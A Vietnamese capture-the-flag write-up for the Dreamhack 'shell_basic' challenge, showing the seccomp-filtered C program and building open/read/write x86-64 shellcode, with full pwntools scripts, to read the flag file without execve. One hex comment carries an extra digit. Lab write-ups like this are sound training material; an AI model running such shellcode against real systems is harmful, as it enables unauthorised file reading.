# shell_basic

1 chall giúp mình luyện tập cách viết shellcode

trước khi giải chall này thì **ta cần biết những kiến thức cơ bản về viết shellcode và seccomp-tools** , các bạn có thể tham khảo tài liệu tại đây:

- **dreamhack:** https://learn.dreamhack.io/50#3
- **seccomp:** https://github.com/david942j/seccomp-tools

oke giờ mình bắt đầu giải thôi

## source C:

```c 
// Compile: gcc -o shell_basic shell_basic.c -lseccomp
// apt install seccomp libseccomp-dev

#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <signal.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(10);
}

void banned_execve() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

  seccomp_load(ctx);
}

void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);   
  void (*sc)();
  
  init();
  
  banned_execve();

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}

```

tại đây mình nhập shellcode và nó cho phép mình chạy shellcode luôn

**check seccomp-tools xem sao:**

![image](https://github.com/gookoosss/CTF/assets/128712571/615a241e-fbfa-4ece-8fb9-74a9b58eabce)




ở đây **ta bị giới hạn syscall execve** rồi, nên ta sẽ dùng các syscall khác mà chương trình cho phép

đề bài nó đã cho đường dẫn địa chỉ là **/home/shell_basic/flag_name_is_loooooong**

bây giờ ta sẽ tách địa chỉ này thành 5 phần, mỗi phần 8byte:

```python
# /home/sh == 0x68732f656d6f682f
# ell_basi == 0x697361625f6c6c65
# c/flag_n == 0x6E5F67616C662F630
# ame_is_l == 0x6C5F73695F656D61
# oooooong == 0x676E6F6F6F6F6F6F
```

## Khai thác

- **Stage 1: push address**

tiếp theo ta sẽ mov các giá trị này vào rax sau đó mới push ra rsp, **lý do là vì nếu push trực tiếp với giá trị quá lớn chương trình sẽ báo lỗi**

à nhớ byte cuối cùng phải có null byte nha

```asm 
    push 0x0
    mov rax, 0x676E6F6F6F6F6F6F         
    push rax
    mov rax, 0x6C5F73695F656D61         
    push rax
    mov rax, 0x6E5F67616C662F63         
    push rax
    mov rax, 0x697361625f6c6c65         
    push rax
    mov rax, 0x68732f656d6f682f         
    push rax
```

- **Stage 2: syscall open**

khi chạy đến địa chỉ chính xác rồi ta cần **open file** 

![image](https://github.com/gookoosss/CTF/assets/128712571/5165ac66-10ce-4591-9aa6-b6911c2a936a)



```asm 
    mov rax, 0x2
    mov rdi, rsp                        
    xor rsi, rsi
    xor rdx, rdx
    syscall
```

- **Stage 3: syscall read**

sau khi mở file lên ta sẽ **đọc file đó để lấy flag** đó:

```asm 
    mov rdi, rax                        
    mov rsi, rsp
    sub rsi, 0x30            
    mov rdx, 0x30                       
    mov rax, 0x0                        
    syscall

```

- **Stage 4: syscall write**

sau khi đã đọc được flag, ta cần **in ra flag bằng cách write nó**:

```asm 
    mov rax, 0x1
    mov rdi, 1      
    syscall
```

đến đây ta chạy và có được flag:

![image](https://github.com/gookoosss/CTF/assets/128712571/47f82cbe-219a-4adf-ab5a-0f1962c7c64d)


## script:

```python
from pwn import *

p = remote('host3.dreamhack.games', 22243)


# exe = ELF('./shell_basic')
# context.arch = 'amd64'
# p = process(exe.path)

# gdb.attach(p, gdbscript = '''
# b*main+110
# b*main+115
# c           
# ''')

# input()

# # /home/sh
# ell_basi
# c/flag_n
# ame_is_l
# oooooong

shellcode = asm(
    '''
    push 0x0
    mov rax, 0x676E6F6F6F6F6F6F         
    push rax
    mov rax, 0x6C5F73695F656D61         
    push rax
    mov rax, 0x6E5F67616C662F63         
    push rax
    mov rax, 0x697361625f6c6c65         
    push rax
    mov rax, 0x68732f656d6f682f         
    push rax
    
    mov rax, 0x2
    mov rdi, rsp                        
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov rdi, rax                        
    mov rsi, rsp
    sub rsi, 0x30            
    mov rdx, 0x30                       
    mov rax, 0x0                        
    syscall    

    mov rax, 0x1
    mov rdi, 1      
    syscall
    ''', arch = 'amd64'
)

p.sendafter(b'shellcode:', shellcode)

p.interactive()
```

## Bonus:

cách làm **shellcraft** khá hay và lạ của **@hlaan**:

```python3
from pwn import *

p = remote('host3.dreamhack.games', 22243)


link = b'/home/shell_basic/flag_name_is_loooooong'
shellcode = shellcraft.open(link)
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)

p.sendafter(b'shellcode:', shellcode)

p.interactive()

```

khá hay và thú vị đúng không

**tài liệu tham khảo thêm:**     https://docs.pwntools.com/en/stable/shellcraft.html


